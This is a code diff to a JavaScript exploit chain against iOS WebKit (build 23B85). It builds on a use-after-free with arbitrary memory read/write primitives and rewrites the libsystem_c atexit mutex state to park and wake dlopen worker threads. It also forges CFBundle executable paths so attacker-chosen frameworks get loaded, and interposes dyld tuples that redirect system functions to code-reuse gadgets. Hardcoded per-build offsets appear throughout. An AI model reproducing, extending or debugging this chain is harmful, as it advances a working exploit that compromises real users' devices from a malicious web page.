@@ -198,24 +198,41 @@ class Encoder {
     }
 };
 const canvas = new OffscreenCanvas(64, 64);
-// "pass" the atexit mutex: let the main-worker load's ___cxa_atexit acquire+release WITHOUT
-// parking, while PRESERVING the kernel waiter-count (bit 0x100). Writing a bare 0x00 clears
-// that count, so the release takes the no-waiters userspace fast-path and never issues the
-// kernel wake -> the parked dlopen-worker is never resumed, its dlopen_from never finalizes,
-// and the hijacked-loader interpose write never fires (both worker1 buffer AND worker2 size
-// stay stale). Clearing only the low-byte held flags keeps us unlocked (0x00-equivalent, no
-// freeze) but retains the waiter so the release wakes the parked worker. No-op when nothing
-// is parked (early stage4 load: 0x00 & ~0xff = 0x00, no phantom waiter). DarkSword kept the
-// count via 0x101 (18.6 flag layout); on 26.1 the held-bit is 0x02 (bit0 = kernel ulock-allocated
-// flag, so a cycling mutex reads 0x01/0x03), so we clear the low byte. NOTE (verified vs 23B85
-// libsystem_pthread): 0x100 is the low-half waiter-COUNT unit; a waking release bumps the HIGH-half
-// wake-generation by the same unit, so after a real wake the word rests at 0x0000010000000100 and a
-// later release will NOT wake again (low count == high count). armAtexitPass() (read & ~0xff)
-// therefore CANNOT re-arm after a genuine wake -- re-arming requires zeroing the high half (the wake
-// loops' explicit write64(atexitState, 0x100)); seeing 0x10000000100 flat-line is proof a wake fired.
-function armAtexitPass() {
-    const a = offsets.libsystem_c__atexit_mutex + structs.Atexit_mutexState;
-    p.write64(a, p.read64(a) & ~0xffn);
+// --- atexit mutex state management (26.1 layout: bit1=held, bit0=kernel-ulock-allocated flag,
+// low-half bits 8-31 = waiter count in 0x100 units, high-half bits 32+ = wake generation).
+// A release broadcasts ONLY when low waiter count > high wake generation; after a real wake the
+// word rests at 0x0000010000000100 (count == gen) and NO further wake fires until we re-arm by
+// zeroing the gen. DarkSword's bare values do exactly that: 0x102 arms a park (held + waiter,
+// gen 0), 0x101 fires a wake (held clear, kernel flag + waiter, gen 0 -> count > gen). NEVER
+// write 0x03 (no waiter -> no wake) or 0x00 (count == gen -> no wake), and never RMW-preserve
+// the wake generation (that leaves count == gen -> the next park's release never fires, which is
+// what stalled worker2's wake at 13M spins).
+const Atexit_mutexStateAddr = () => offsets.libsystem_c__atexit_mutex + structs.Atexit_mutexState;
+// PARK: held + a registered waiter, gen zeroed (worker blocks; the next release with count>gen wakes it).
+function atexitHold() { p.write64(Atexit_mutexStateAddr(), 0x102n); }
+// WAKE/PASS: held clear so the next __cxa_atexit acquires; kernel flag + waiter kept; gen zeroed
+// so count(0x100) > gen(0) and its release broadcasts to the parked worker.
+function atexitPass() { p.write64(Atexit_mutexStateAddr(), 0x101n); }
+// SILENT: proceed with NO broadcast: held + waiter clear, kernel flag kept, count == gen -> a
+// release takes the no-waiters path and the parked worker stays parked.
+function atexitSilent() { p.write64(Atexit_mutexStateAddr(), 0x01n); }
+// legacy name used across the chain: arm the pass state before a load.
+function armAtexitPass() { atexitPass(); }
+
+// Scan a parked worker's stack for candidate RETURN ADDRESSES (shared-cache code range) so we can
+// symbolize the exact function its dlopen is stuck in offline (ipsw a2s). This answers the one
+// question everything hinges on: does the woken worker's dlopen RETURN, or where does it park?
+function dumpWorkerStack(worker, tag) {
+    try {
+        const sb = p.read64(worker.thread + structs.Thread_stackBottom);
+        const st = p.read64(worker.thread + structs.Thread_stackTop);
+        const out = [];
+        for (let a = st; a < sb && out.length < 48; a += 8n) {
+            const v = p.read64(a);
+            if (v > 0x180000000n && v < 0x210000000n && (v & 3n) === 0n) out.push(hex(v - p.slide));
+        }
+        postMessage(`[stackdump ${tag}] ${out.length} cands: ${out.join(' ')}`);
+    } catch (e) { postMessage(`[stackdump ${tag}] ERR ${e && (e.message || e)}`); }
 }
 
 async function loadObjcClass(cls) {
@@ -230,12 +247,40 @@ async function loadObjcClass(cls) {
     const wrappedBitmap = p.read64(ab + p.structs.JSImageBitmap_wrapped);
     const imagebuffer = p.read64(wrappedBitmap + p.structs.ImageBitmap_buffer);
     p.write64(imagebuffer + p.structs.ImageBuffer_objcClass, cls);
+    // NOTE: do NOT zero the loader onceToken here. DarkSword zeroes only at the re-arm/fire
+    // sites. Zeroing before EVERY plant races EVERY in-flight dispatch_once completion
+    // (a parked worker's AVLoadSpeech gate completing after our re-zero -> foreign port ->
+    // _dispatch_gate_broadcast_slow brk) and drove the crash rate to ~100% on 26.1.
     slog(`[loadObjcClass] class planted; close()...`);
     bitmap.close();
-    // park-next write (0x03 = fake-held for the NEXT worker's __cxa_atexit). SUPPRESSED during wake
-    // broadcasts (p.noAtexitPark): a wake load must leave the mutex unheld, or the woken worker's
-    // re-acquire sees held and re-parks -- the wake dies. The stage5/6 tails park explicitly later.
-    if (!p.noAtexitPark) p.write64(offsets.libsystem_c__atexit_mutex + structs.Atexit_mutexState, 0x03n);
+    // park-next: hold the mutex with a registered waiter (0x102) so the NEXT worker's __cxa_atexit
+    // blocks AND its later release wakes it. SUPPRESSED during wake broadcasts (p.noAtexitPark):
+    // a wake load must leave the mutex unheld, or the woken worker's re-acquire re-parks it.
+    if (!p.noAtexitPark) atexitHold();
+}
+
+// _dispatch_gate_broadcast_slow (libdispatch, 23B85) asserts the COMPLETING thread owns the gate
+// (onceToken == its own tsd port; |1/|2 contention bits are TOLERATED, AGENTS.md §5i). The
+// woken worker's dispatch_once (from its park) completes only once its gate block RETURNS — and
+// worker1's block sits in Bambi session/analytics XPC after its NSBundle load finished (§5n
+// disasm: no in-image blocking prims; the lag is SERVICE latency, uncontrollable, observed >12s).
+// Meanwhile the token still holds fire-2's seed (w1tok&~3) — the ONLY value its completion can
+// legally unlock. If we re-zero/reseed before that completion lands (stage5-tail, stage6, fire
+// 3's seed), the completion sees a foreign port -> brk (the fire-3 deaths). So: after worker1's
+// interpose, HOLD atexitPass and wait for the token to reach -1 (its completion landing on the
+// seed) BEFORE any re-zero. Timeout is 60s (XPC latency, not lock latency — 12s was too short).
+// Yield via setTimeout so the worker gets scheduled.
+async function waitGateQuiesce(tag) {
+    let waited = 0;
+    let tok = p.read64(offsets.AVFAudio__AVLoadSpeechSynthesisImplementation_onceToken);
+    while (tok !== 0xffffffffffffffffn && waited < 60000) {
+        atexitPass();   // keep the atexit mutex PASS so the woken worker's epilogue __cxa_atexit calls proceed -> its dlopen returns -> its gate completes
+        await new Promise(r => setTimeout(r, 25));
+        waited += 25;
+        if (waited % 5000 === 0) postMessage(`[gatequiesce] ${tag}: still waiting +${waited}ms tok=${hex(tok)}`);
+        tok = p.read64(offsets.AVFAudio__AVLoadSpeechSynthesisImplementation_onceToken);
+    }
+    postMessage(`[gatequiesce] ${tag}: ${waited}ms tok=${hex(tok)}${waited >= 60000 ? ' (TIMEOUT — gate did NOT complete; a dump of the worker park site would tell us why)' : ''}`);
 }
 
 // Synchronous web-feature dlopens (the writeup's "alternative path"): each of these makes WebCore
@@ -342,7 +387,7 @@ async function loadPrereqSilently(path, lockAddr, tok) {
     p.write8(p.TextToSpeech_CFBundle + structs.CFBundle_loadedFlag, 0n);
     p.write64(offsets.CFNetwork__gConstantCFStringValueTable + structs.CFString_dataPtr, cs.ptr);
     p.write64(offsets.CFNetwork__gConstantCFStringValueTable + structs.CFString_length, cs.len);
-    p.write64(offsets.libsystem_c__atexit_mutex + structs.Atexit_mutexState, 0n);
+    atexitSilent();   // prereq load must not broadcast (parked worker stays parked)
     p.silentLoad = true;
     await loadObjcClass(nextAVSpeechClass());
     p.silentLoad = false;
@@ -358,12 +403,12 @@ async function fireWakeTarget(t, lockAddr, tok) {
             t.prereqDone = true;
         }
         const l0 = dyldLoadedCount();
-        p.write64(offsets.libsystem_c__atexit_mutex + structs.Atexit_mutexState, 0x100n);
+        atexitPass();
         try { await loadObjcClass(t.cls); } catch (e) { postMessage(`[wake] ${t.name} ERR ${e && (e.message || e)}`); }
         const l1 = dyldLoadedCount();
         t.spent = (l1 !== l0);
         postMessage(`[wake] fired ${t.name}: loaded ${l0}->${l1}${t.spent ? ' SPENT' : ' (no fresh load -- will try next target)'}`);
-        p.write64(offsets.libsystem_c__atexit_mutex + structs.Atexit_mutexState, 0x100n);  // re-arm for the next broadcast
+        atexitPass();   // keep the waiter registered for the next broadcast
     } finally {
         p.noAtexitPark = false;
     }
@@ -473,7 +518,7 @@ async function wakeViaMapRedirect(path, tok) {
     const l0 = dyldLoadedCount();
     p.write64(mr.slot, mr.borrow);                                  // TTS path -> borrowed REAL bundle
     p.noAtexitPark = true;
-    p.write64(offsets.libsystem_c__atexit_mutex + structs.Atexit_mutexState, 0x100n);
+    atexitPass();                                                   // wake state: held clear, waiter kept (was bare 0x100)
     p.write64(offsets.AVFAudio__AVLoadSpeechSynthesisImplementation_onceToken, 0n);  // loader +initialize stub early-rets on -1
     const wakeCls = nextAVSpeechClass();                            // FRESH class -- +initialize fires once per class ever
     postMessage(`[mapredir] firing plant ${hex(wakeCls)}`);
@@ -493,7 +538,7 @@ async function wakeViaMapRedirect(path, tok) {
     p.write8(mr.borrowCF + structs.CFBundle_loadedFlag, 1n);
     const l1 = dyldLoadedCount();
     postMessage(`[mapredir] wake via ${path}: loaded ${l0}->${l1}`);
-    p.write64(offsets.libsystem_c__atexit_mutex + structs.Atexit_mutexState, 0x100n);
+    atexitPass();                                                   // keep the waiter registered for the next broadcast
     return l1 !== l0;
 }
 // Ordered fresh-path queue (both stages draw from it; each fire must produce NEW images or we
@@ -501,32 +546,35 @@ async function wakeViaMapRedirect(path, tok) {
 // loaded) but AppleCV3D was already resident -> zero new images. Ranked YES+likely-fresh queue
 // from extracted/atexit-wake-paths-wide.md (74 YES of 4191 images, reverse-importer screened).
 const WAKE_PATHS = [
-    '/System/Library/PrivateFrameworks/XGBoostFramework.framework/XGBoostFramework',           // 33 inits, only CreateMLComponents imports it -- PROVEN to load+wake worker1
-    // The C++-native family (the family XGBoost proved loads cleanly in WebContent). The
-    // XOJIT-family below all failed to load in WebContent (run 131246 stage6: cf.loaded=0,
-    // loadedNow flat for every one) -- likely JIT/entitlement-restricted, kept only as last resorts.
-    '/System/Library/PrivateFrameworks/TuriCore.framework/TuriCore',                            // 918 inits, CreateML only (XGBoost family)
+    '/System/Library/PrivateFrameworks/XGBoostFramework.framework/XGBoostFramework',           // worker1 wake: PROVEN to load+wake (CreateML family)
+    '/System/Library/PrivateFrameworks/HomeUI.framework/HomeUI',                                // worker2 wake: DarkSword's proven framework -- DISTINCT family + fresh (never resident), so the two legs never reload the same or a bad framework
+    // Fallbacks only (keep the mapredir mechanism -- NSBundle-direct is CAS-hardened):
+    '/System/Library/PrivateFrameworks/TuriCore.framework/TuriCore',                            // same family as XGBoost (CreateML) -- deprioritized
     '/System/Library/PrivateFrameworks/MacinTalk.framework/MacinTalk',                          // 3 inits, nothing links it
     '/System/Library/PrivateFrameworks/ProVideo.framework/ProVideo',                            // 6 inits, CameraEffectsKit
     '/System/Library/PrivateFrameworks/CorePhotogrammetry.framework/CorePhotogrammetry',        // 3 inits, CoreOC
-    '/System/Library/PrivateFrameworks/GPUCompiler.framework/Libraries/libGPUCompilerImpl.dylib', // 19 inits YES -- RESIDENT on this vphone (first fire completes with no new image)
-    '/System/Library/PrivateFrameworks/XOJIT.framework/XOJIT',                                  // 71 inits, PreviewShellKit only -- failed to load
-    '/System/Library/PrivateFrameworks/ObjectUnderstanding.framework/ObjectUnderstanding',      // 24 inits -- failed to load
-    '/System/Library/PrivateFrameworks/IntelligenceEngine.framework/IntelligenceEngine',        // 17 inits, SiriKitFlow only -- failed to load
-    '/System/Library/PrivateFrameworks/CoreIndoor.framework/CoreIndoor',                        // 17 inits, nothing links it -- failed to load
-    '/System/Library/PrivateFrameworks/DialogEngine.framework/DialogEngine',                    // 10 inits, Siri stack -- failed to load
-    '/System/Library/PrivateFrameworks/AppleCV3D.framework/AppleCV3D',                          // resident on this vphone (kept as proof the queue advances)
+    '/System/Library/PrivateFrameworks/GPUCompiler.framework/Libraries/libGPUCompilerImpl.dylib', // RESIDENT on this vphone (fire = no new image, no wake)
+    '/System/Library/PrivateFrameworks/XOJIT.framework/XOJIT',                                  // failed to load
+    '/System/Library/PrivateFrameworks/ObjectUnderstanding.framework/ObjectUnderstanding',      // failed to load
+    '/System/Library/PrivateFrameworks/IntelligenceEngine.framework/IntelligenceEngine',        // failed to load
+    '/System/Library/PrivateFrameworks/CoreIndoor.framework/CoreIndoor',                        // failed to load
+    '/System/Library/PrivateFrameworks/DialogEngine.framework/DialogEngine',                    // failed to load
+    '/System/Library/PrivateFrameworks/AppleCV3D.framework/AppleCV3D',                          // resident on this vphone
 ];
-async function fireNextWakePath(tok) {
-    while (true) {
-        const i = (p.wakePathIdx = (p.wakePathIdx ?? 0) + 1) - 1;
-        if (i >= WAKE_PATHS.length) {
-            postMessage('[mapredir] wake-path queue EXHAUSTED (all produced no new images)');
-            return false;
-        }
-        postMessage(`[mapredir] wake path ${i}: ${WAKE_PATHS[i]}`);
-        if (await wakeViaMapRedirect(WAKE_PATHS[i], tok)) return true;
-    }
+// Direct per-worker wake frameworks (NO shared queue): each worker gets ONE proven, distinct,
+// fresh framework, fired ONCE at the 250k-spin mark. This avoids the WAKE_PATHS array burning the
+// 3-class AVSpeech pool on retries (every pool-spent fire loads nothing -> the gate never completes).
+// Both are proven to load+wake in WebContent via the mapredir mechanism (NOT NSBundle-direct).
+// worker2 wake: MacinTalk — 3 inits, NOTHING LINKS IT (never resident -> loads fresh; the
+// CorePhotogrammetry pick was already resident: fire produced 1547->1547, and the retry loop then
+// clobbered device memory — see the device-clobber guard at both fireWorkerWake call sites).
+// The 3-init tree shrinks the chain's [broadcast -> block return -> seed w2tok] window from ~90ms
+// (TuriCore, fire3.ips) to ~ms, so the seed lands before worker2's completion.
+const W1_WAKE_PATH = '/System/Library/PrivateFrameworks/XGBoostFramework.framework/XGBoostFramework'; // proven to load+wake (kept)
+const W2_WAKE_PATH = '/System/Library/PrivateFrameworks/MacinTalk.framework/MacinTalk';               // fresh + 3 inits (was TuriCore)
+async function fireWorkerWake(path, tok) {
+    postMessage(`[mapredir] worker wake: ${path}`);
+    return await wakeViaMapRedirect(path, tok);
 }
 
 
@@ -620,7 +668,7 @@ const VERSIONS = {
             "WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts": 0x1eb03ec80n,
             "libARI_cstring": 0x2958de820n,
             "libGPUCompilerImplLazy_cstring": 0x24c060870n,
-            "libGPUCompilerImplLazy__invoker": 0x24cf168b4n,
+            "libGPUCompilerImplLazy__invoker": 0x24cc2fb90n, // the invoker THUNK on 23B85 (pacibsp; ldp x8,x0,[x0]; blraaz x8; mov w0,#0; retab) -- NOT 0x24cf168b4 (mid-function garbage)
             "libsystem_pthread_base": 0x1df14d000n,
             "pthread_linkedit": 0x1ffd24000n,
             "PerfPowerServicesReader_cstring": 0x25e025e60n,
@@ -633,6 +681,12 @@ const VERSIONS = {
             "WebCore__initPKContact_once": 0x1ed625138n,
             "WebCore__initPKContact_value": 0x1ed625140n,
             "WebCore__TelephoneNumberDetector_phoneNumbersScanner_value": 0x1eb084030n,
+            // 23B85 disasm-verified (TelephoneNumberDetector::find 0x1a1059f80 + init lambda 0x1a105d2f4):
+            // the scanner OBJECT global find() passes to the DDDFA slot, its std::call_once guard
+            // (-1 = ready), and the isSupported byte (1 = skip the zeroing path).
+            "WebCore__TND_scannerObject": 0x1eb083f78n,
+            "WebCore__TND_scannerOnce": 0x1eb083f80n,
+            "WebCore__TND_supportedFlag": 0x1eb083f10n,
             "WebCore__HTMLDocument_vtable": 0x1f1376268n,
             "DesktopServicesPriv_bss": 0x1ecff4080n,
             "GetCurrentThreadTLSIndex_CurrentThreadIndex": 0x280c6e460n,
@@ -642,13 +696,16 @@ const VERSIONS = {
             "libdyld__dlsym": 0x1800e8444n,
             "jsc_base": 0x197f59000n,
             "dyld__dlopen_from_lambda_ret": 0x18013a89cn, // ret into APIs::dlopen_from after the load-lambda(0x1801533b4) call; 3 sites 0x18013a89c/0x18013a944/0x18013a980 - primary=first, confirm on-device which is on the parked stack (was stale 0x18011cfc8=aligned_alloc+184)
-            "dyld__signPointer": 0x1801283e4n, //todo verify offset finder thinks correct 
+            "dyld__signPointer": 0x1801464c0n, // 23B85 free fn signPointer(u64,void*,bool,u16,ptrauth_key) @ nm extracted/dyld; 18.6's ChainedFixupPointerOnDisk::Arm64e::signPointer is 0x18011e210 here but with a DIFFERENT signature than 18.6's -- slow_pacia's (self,ctx,ptr) convention matches NEITHER directly; adapt before slow_pacia/JOP use. NOT needed for the slow_dlopen/dlsym self-test.
             "dyld__RuntimeState_emptySlot": 0x180162658n, // RuntimeState::emptySlot() = vtable[0] (read from __ZTVN5dyld412RuntimeStateE+0x10; was stale 0x18015eb6c=decDlRefCount+632)
             "WebProcess_ensureGPUProcessConnection": 0x19e16f334n,
             "WebProcess_gpuProcessConnectionClosed": 0x19e16f628n,
             "Security__SecKeychainBackupSyncable_block_invoke": 0x1888d9b94n,
             "Security__SecOTRSessionProcessPacketRemote_block_invoke": 0x1888ee884n,
             "MediaAccessibility__MACaptionAppearanceGetDisplayType": 0x1b021f5c0n,
+            "MediaAccessibility__MACaptionAppearanceGetTextEdgeStyle": 0x1b0221960n, // the caption-BATTERY function (called by captionsStyleSheetOverride on 26.1; GetDisplayType is gated by Manual mode and never fires)
+            "WebCore__softLinkMediaAccessibilityMACaptionAppearanceGetTextEdgeStyle": 0x1ee638648n, // ipsw dyld softlinks: init-fn 0x1a1056008
+            "WebCore__initMediaAccessibilityMACaptionAppearanceGetTextEdgeStyle_once": 0x1eb083d48n,
             "JavaScriptCore__globalFuncParseFloat": 0x1991abde8n,
             "HOMEUI_cstring": 0x1834dbfa1n,
             "ImageIO__IIOLoadCMPhotoSymbols": 0x185e73768n,
@@ -1463,7 +1520,11 @@ async function stage4() {
         postMessage(`dispatchBlock: ${hex(dispatchBlock)}`);
         p.write64(dispatchBlock + structs.DispatchBlock_invoke, paciza_nullfunc);
     }
-    const classes = [offsets.TextToSpeech__OBJC_CLASS__TtC12TextToSpeech27TTSMagicFirstPartyAudioUnit, offsets.AVFAudio__OBJC_CLASS__AVSpeechSynthesisMarker];
+    // worker1's park class: AVFAudio AVSpeechSynthesisProviderAudioUnit (fast AVFAudio loader that
+    // COMPLETES its +initialize, unlike the TextToSpeech TTSMagic class which parks in Bambi
+    // session-analytics and lags the once-gate completion -> the recurring dispatch-gate brk).
+    // Using the wake-pool's spare class so Synthesizer/ProviderVoice stay fresh for the wake fires.
+    const classes = [offsets.AVFAudio__OBJC_CLASS__AVSpeechSynthesisProviderAudioUnit, offsets.AVFAudio__OBJC_CLASS__AVSpeechSynthesisMarker];
     for (let i = 0; i < 2; ++i) {
         const worker = p.dlopen_workers[i];
         const wrappedBitmap = p.read64(worker.bitmap + structs.JSImageBitmap_wrapped);
@@ -1504,14 +1565,17 @@ async function stage4() {
     // executable path at a forged CFString {cstringOffset, cstringSize}. The NEXT realization of
     // an AVFAudio class then dlopens that path instead of the real speech engine.
     // Write a NUL-terminated ASCII C string into a fresh, GC-pinned buffer and return its
-    // backing-store pointer (m_vector @ addrof+0x10, the pattern proven in stage1's self-test).
-    // Lets us hand CoreFoundation an attacker-controlled path with no dependency on a cache literal.
-    p.cstrings = p.cstrings || [];
+    // NUL-terminated ASCII C string via DarkSword's rope-flattening trick: `str + '\0'` builds a
+    // JSRopeString, `delete rope_resolver[str]` forces ToPropertyKey -> flattens it into a
+    // contiguous 8-bit StringImpl, then JSString+8 -> StringImpl*, StringImpl+8 -> the char data.
+    // This is DarkSword's proven robust path (no Uint8Array backing-store games, no addrof+0x10
+    // fragility). Lets us hand CoreFoundation/dyld an attacker-controlled C string.
+    p.ropeResolver = p.ropeResolver || [];
     p.makeCString = (str) => {
-        const bytes = new Uint8Array(str.length + 1);            // + NUL
-        for (let i = 0; i < str.length; i++) bytes[i] = str.charCodeAt(i);
-        p.cstrings.push(bytes);                                  // pin for lifetime (GC already off)
-        return { ptr: p.read64(p.addrof(bytes) + 0x10n), len: BigInt(str.length) };
+        str = str + '\0';
+        delete p.ropeResolver[str];                            // flatten the rope -> contiguous StringImpl
+        const name_ptr = p.read64(p.read64(p.addrof(str) + 8n) + 8n);   // JSString+8 -> StringImpl+8 -> data
+        return { ptr: name_ptr, len: BigInt(str.length - 1) };
     };
 
     p.rearmCFBundleLoader = (cstringOffset, cstringSize) => {
@@ -1521,7 +1585,7 @@ async function stage4() {
         p.write64(offsets.CFNetwork__gConstantCFStringValueTable + structs.CFString_dataPtr, cstringOffset);
         p.write64(offsets.CFNetwork__gConstantCFStringValueTable + structs.CFString_length, cstringSize);
         p.write64(TextToSpeech_CFBundle + structs.CFBundle_execPath, offsets.CFNetwork__gConstantCFStringValueTable);
-        p.write64(offsets.libsystem_c__atexit_mutex + structs.Atexit_mutexState, 0x03n);
+        atexitHold();   // park the next worker's __cxa_atexit with a registered waiter (was bare 0x03, which erased the waiter registration)
     }
 
     // worker1 park target = libARI (DarkSword's original). Confirmed present + parks on vphone 2026-07-11
@@ -1663,7 +1727,7 @@ async function stage5() {
 
     postMessage(`[stage5] going to load AVSpeechSynthesisVoice`);
   // --- silent load: worker1 sleeps through the whole load — no wake, no stale unlock ---
-p.write64(offsets.libsystem_c__atexit_mutex + structs.Atexit_mutexState, 0n);  // pass-through, no broadcast
+atexitSilent();   // pass-through, no broadcast (held + waiter cleared, kernel flag kept)
 p.silentLoad = true;
 
         // arm the bundle-lock handoff on worker2 BEFORE the wake-load — close() blocks this thread
@@ -1680,7 +1744,7 @@ p.silentLoad = true;
     const w1tok = BigInt(worker.threadPort);
     const lockAddr = p.TextToSpeech_NSBundle + structs.NSBundle_lock;
     p.write32le(lockAddr, w1tok);
-    p.write64(offsets.libsystem_c__atexit_mutex + structs.Atexit_mutexState, 0x100n);
+    atexitPass();   // arm the wake: held clear + waiter kept so the next __cxa_atexit release broadcasts
     pumpSoftlink();          // chain-side synchronous softlink dlopens (this thread)
     postMessage({ type: 'pump_start' });   // page-side window-only battery
     initWakeTargets();
@@ -1695,15 +1759,20 @@ p.silentLoad = true;
         if (__buf === interposingTuples_data_ptr && __w !== w1tok) break;  // dyld wrote OUR buffer AND worker1 fully unlocked
         if (++__spins % 250000 === 0) {
             p.reestablishRead64();   // pump-driven dlopens clobber read64Str's backing (see read64 re-linker note) -- stale 0x9 reads / write64 recursion crash otherwise
-            // re-arm ONLY from 0: a blind 0x100 store can clobber a live 0x103 acquisition (another
+            // re-arm ONLY from 0: a blind re-arm can clobber a live 0x103 acquisition (another
             // thread mid-__cxa_atexit, which the pump is deliberately provoking) -> atexit list
-            // corruption -> crash. The waiter bit is sticky (releases preserve it), so 0x100 needs no refresh.
+            // corruption -> crash. The waiter bit is sticky (releases preserve it), so it needs no refresh.
             const __as = p.read64(offsets.libsystem_c__atexit_mutex + structs.Atexit_mutexState);
-            if (__as === 0n) p.write64(offsets.libsystem_c__atexit_mutex + structs.Atexit_mutexState, 0x100n);
+            if (__as === 0n) atexitPass();
             // PRIMARY wake: NSMapTable redirect (clone-bundle load of a fresh framework, own lock).
             // Fallback every 3M spins: the plant-target sequencer.
             if (__spins === 250000) {
-                await fireNextWakePath(w1tok);
+                const __ok = await fireWorkerWake(W1_WAKE_PATH, w1tok);
+                // DEVICE-CLOBBER GUARD: a resident/bad wake path (fire produced no new image)
+                // means EVERY retry below just churns loads until the device dies (the
+                // CorePhotogrammetry 1547->1547 crash, 2026-07-21). Abort the attempt; the
+                // watchdog reloads a fresh one instead of hammering fallback loads.
+                if (!__ok) { postMessage(`[stage5] wake fire produced NO new image (${W1_WAKE_PATH} resident/bad) -- aborting attempt (device-clobber guard)`); postMessage({ type: 'pump_stop' }); return false; }
             } else if (__spins % 3000000 === 0) {
                 const t = nextWakeTarget();
                 if (t) await fireWakeTarget(t, lockAddr, w1tok);
@@ -1722,9 +1791,21 @@ p.silentLoad = true;
     }
     postMessage({ type: 'pump_stop' });
     postMessage(`[stage5] worker1 interposed for real: buffer=${hex(__buf)} lock=${hex(__w)}`);
+    dumpWorkerStack(worker, 'worker1-post-interpose');   // where is worker1's dlopen parked now?
+
+    // §5i race RESOLVED by crash capture (fire3.ips, 2026-07-21): the fire-3 crasher is worker2's
+    // dispatch_once COMPLETION (thread 13: its close() handler -> _dispatch_gate_broadcast_slow)
+    // firing while the chain's fire-3 block still owns the gate (thread 10: dispatch_once_callout
+    // -> _AVLoadSpeechSynthesisImplementation). worker1's block NEVER completes (12s AND 60s
+    // waitGateQuiesce both timed out — it hangs in Bambi session XPC forever), so no serialize
+    // wait is needed or possible for worker1; the waitGateQuiesce call was REMOVED (pure cost).
+    // The real race is worker2's [wake -> completion] (~ms) vs the chain's [broadcast -> block
+    // return -> seed w2tok] (~90ms with TuriCore, 20:56 measurement). Fix: shrink the chain's
+    // window by waking worker2 with a 3-initializer framework (W2_WAKE_PATH), so the seed lands
+    // before worker2's completion.
 
     // --- re-arm to PARK worker2, redirect the bundle to PerfPower ---
-    p.write64(offsets.libsystem_c__atexit_mutex + structs.Atexit_mutexState, 0x03n);
+    atexitHold();   // park worker2's __cxa_atexit with a registered waiter (was bare 0x03)
     p.write64(offsets.AVFAudio__AVLoadSpeechSynthesisImplementation_onceToken, 0n);
     p.write64(p.TextToSpeech_NSBundle + structs.NSBundle_lock, 0n);
     p.write64(p.runtimeStateLock + structs.RuntimeStateLock_word, 0n);
@@ -1796,7 +1877,7 @@ async function stage6() {
     // Prefer the read64/write64-based addrof/fakeobj: they survive stage4's close()/park that
     // reclaims the UAF's dangling cell and breaks the original ones. Fall back to UAF only if
     // the rebuild self-check failed.
-p.write64(offsets.libsystem_c__atexit_mutex + structs.Atexit_mutexState, 0n);  // pass-through, no broadcast
+atexitSilent();   // pass-through, no broadcast (held + waiter cleared, kernel flag kept)
 p.silentLoad = true;
 
     await new Promise(r => setTimeout(r, 550));
@@ -1828,7 +1909,14 @@ p.write64(p.TextToSpeech_NSBundle + structs.NSBundle_lock, 0n);     // wipe the 
         p.interposingTuples[interpose_index++] = val;
         p.interposingTuples[interpose_index++] = ptr;
     }
-    interpose(offsets.MediaAccessibility__MACaptionAppearanceGetDisplayType, offsets.ImageIO__IIOLoadCMPhotoSymbols);
+    // Tuple #1: the caption-BATTERY function MACaptionAppearanceGetTextEdgeStyle (NOT GetDisplayType:
+    // on 26.1 the 2015-behavior ctor pins CaptionDisplayMode::Manual, so captionDisplayMode() never
+    // calls the platform GetDisplayType -- that carrier was dead, run B proved it with zero globals).
+    // captionsStyleSheetOverride() calls captionsTextEdgeCSS() on EVERY stylesheet build (triggered by
+    // addTextTrack -> registerForCaptionPreferencesChangedCallbacks -> setInterestedInCaptionPreferenceChanges
+    // -> 0s timer), and its garbage return is used as an integer enum -> benign. Its dlsym interposes
+    // to IIOLoadCMPhotoSymbols, which re-resolves the 6 gFunc globals WITH our tuples -> GADGETS.
+    interpose(offsets.MediaAccessibility__MACaptionAppearanceGetTextEdgeStyle, offsets.ImageIO__IIOLoadCMPhotoSymbols);
     interpose(offsets.CMPhoto__kCMPhotoTranscodeOption_Strips, 0n);
     interpose(offsets.CMPhoto__CMPhotoCompressionCreateContainerFromImageExt, offsets.libGPUCompilerImplLazy__invoker);
     interpose(offsets.CMPhoto__CMPhotoCompressionCreateDataContainerFromImage, offsets.Security__SecKeychainBackupSyncable_block_invoke);
@@ -1865,7 +1953,7 @@ p.write64(p.TextToSpeech_NSBundle + structs.NSBundle_lock, 0n);     // wipe the 
     const w2tok = BigInt(worker.threadPort);
     const lockAddr = p.TextToSpeech_NSBundle + structs.NSBundle_lock;
     p.write32le(lockAddr, w2tok);                                   // worker2's stale unlock is legal whenever it fires
-    p.write64(offsets.libsystem_c__atexit_mutex + structs.Atexit_mutexState, 0x100n);
+    atexitPass();   // arm the wake: held clear + waiter kept so the next __cxa_atexit release broadcasts
     pumpSoftlink();          // chain-side synchronous softlink dlopens (this thread)
     postMessage({ type: 'pump_start' });
     // pre-existing interposing state (run 014753: size=9) makes worker2's store land
@@ -1881,11 +1969,13 @@ p.write64(p.TextToSpeech_NSBundle + structs.NSBundle_lock, 0n);     // wipe the 
         if (++__spins % 250000 === 0) {
             p.reestablishRead64();   // pump-driven dlopens clobber read64Str's backing
             const __as = p.read64(offsets.libsystem_c__atexit_mutex + structs.Atexit_mutexState);
-            if (__as === 0n) p.write64(offsets.libsystem_c__atexit_mutex + structs.Atexit_mutexState, 0x100n);  // re-arm only from 0
+            if (__as === 0n) atexitPass();  // re-arm only from 0 (don't clobber a live 0x103 acquisition)
             // PRIMARY wake: NSMapTable redirect (clone-bundle load of a fresh framework, own lock).
             // Fallback every 3M spins: the plant-target sequencer (cursor continues from stage5).
             if (__spins === 250000) {
-                await fireNextWakePath(w2tok);
+                const __ok = await fireWorkerWake(W2_WAKE_PATH, w2tok);
+                // DEVICE-CLOBBER GUARD (same as stage5): resident/bad path -> abort, don't churn.
+                if (!__ok) { postMessage(`[stage6] wake fire produced NO new image (${W2_WAKE_PATH} resident/bad) -- aborting attempt (device-clobber guard)`); postMessage({ type: 'pump_stop' }); return; }
             } else if (__spins % 3000000 === 0) {
                 const t = nextWakeTarget();
                 if (t) await fireWakeTarget(t, lockAddr, w2tok);
@@ -1904,14 +1994,47 @@ p.write64(p.TextToSpeech_NSBundle + structs.NSBundle_lock, 0n);     // wipe the 
     }
     postMessage({ type: 'pump_stop' });
     postMessage(`[stage6] spin done (size=${hex(p.read64(p.p_InterposeTupleAll_size))}); reading softlink globals`);
-    const initMediaAccessibilityMACaptionAppearanceGetDisplayType = p.read64(offsets.WebCore__softLinkMediaAccessibilityMACaptionAppearanceGetDisplayType);
